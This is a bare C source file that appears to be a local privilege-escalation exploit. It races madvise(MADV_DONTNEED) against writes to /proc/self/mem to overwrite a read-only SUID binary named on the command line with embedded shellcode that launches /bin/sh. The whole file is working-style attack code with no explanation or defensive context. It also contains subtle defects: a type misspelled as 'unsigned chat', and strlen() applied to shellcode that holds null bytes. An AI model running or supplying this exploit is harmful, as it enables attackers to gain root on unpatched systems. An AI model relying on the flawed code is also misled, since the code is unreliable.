#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

void *map;
int f;
struct stat st;
char *name;
unsigned chat buf[] = "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x0f\x05";

void *madviseThread(void *arg) {
    int i, c = 0;
    for (i = 0; i < 1000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("madvise %d\n", c);
}

void *procselfmemThread(void *arg) {
    char *payload = (char*)arg;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for (i = 0; i < 1000000; i++) {
        lseek(f, (uintptr_t) map, SEEK_SET);
        c += write(f, payload, strlen(payload));
    }
    printf("procselfmem %d\n", c);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s target_SUID_binary\n", argv[0]);
        return 1;
    }

    pthread_t pth1, pth2;
    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    name = argv[1];
    
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    printf("mmap %zx\n", (uintptr_t) map);
    
    pthread_create(&pth1, NULL, madviseThread, argv[1]);
    pthread_create(&pth2, NULL, procselfmemThread, buf);
    
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    
    return 0;
}
